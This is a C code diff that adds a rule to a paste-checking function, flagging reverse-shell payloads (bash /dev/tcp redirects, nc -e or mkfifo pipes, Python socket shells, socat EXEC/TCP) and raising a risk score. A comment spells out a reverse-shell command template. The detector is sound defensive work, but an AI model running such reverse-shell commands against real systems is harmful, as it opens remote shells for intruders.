@@ -499,6 +499,37 @@ hlse_check_paste(const char *text) {
         }
     }
 
+    /* P9: Reverse shell payloads (Unix) */
+    {
+        int is_revshell = 0;
+        /* bash /dev/tcp redirect: bash -i >& /dev/tcp/IP/PORT 0>&1 */
+        if (strstr(text, "/dev/tcp/") || strstr(text, "/dev/udp/"))
+            is_revshell = 1;
+        /* nc / ncat / netcat reverse shell: nc -e or mkfifo pipe */
+        if (!is_revshell &&
+            (strstr(text, "nc ") || strstr(text, "ncat ") ||
+             strstr(text, "netcat ")) &&
+            (strstr(text, " -e ") || strstr(text, "mkfifo")))
+            is_revshell = 1;
+        /* Python socket reverse shell */
+        if (!is_revshell &&
+            (strstr(text, "socket.") || strstr(text, "connect(")) &&
+            (strstr(text, "subprocess") || strstr(text, "os.dup2") ||
+             strstr(text, "pty.spawn")))
+            is_revshell = 1;
+        /* socat reverse shell */
+        if (!is_revshell &&
+            strstr(text, "socat") &&
+            (strstr(text, "EXEC:") || strstr(text, "TCP:")))
+            is_revshell = 1;
+        if (is_revshell) {
+            v.score += 60;
+            if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
+                snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
+                    "P9: Reverse shell payload (/dev/tcp, nc -e, socat)");
+        }
+    }
+
     /* Compound amplifiers */
     if ((v.signals & PASTE_CURL_PIPE_SH) &&
         (v.signals & PASTE_HIDDEN_NEWLINE)) {
